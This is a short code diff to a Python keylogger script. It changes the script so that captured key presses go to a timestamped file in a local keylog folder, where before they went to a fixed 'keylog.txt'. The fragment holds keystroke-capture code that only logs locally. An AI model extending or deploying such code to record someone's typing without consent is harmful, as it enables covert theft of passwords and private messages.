@@ -4,7 +4,9 @@ import time
 
 if not os.path.exists('./keylog'):
     os.makedirs('./keylog')
-file = open(f'./keylog/keylog_{time.strftime('%Y-%m-%d %H-%M-%S')}.txt', 'w')
+    
+file_path = f'./keylog/keylog_{time.strftime('%Y-%m-%d %H-%M-%S')}.txt'
+file = open(file_path, 'w')
 file.close()
 
 def format_special_key(key):
@@ -17,7 +19,7 @@ def format_special_key(key):
     return special_keys.get(key, f'[{str(key)}]')
 
 def on_press(key):
-    file = open('keylog.txt', 'a')
+    file = open(file_path, 'a')
     try:
         key = key.char
         #print(f'alphanumeric key {key} pressed')
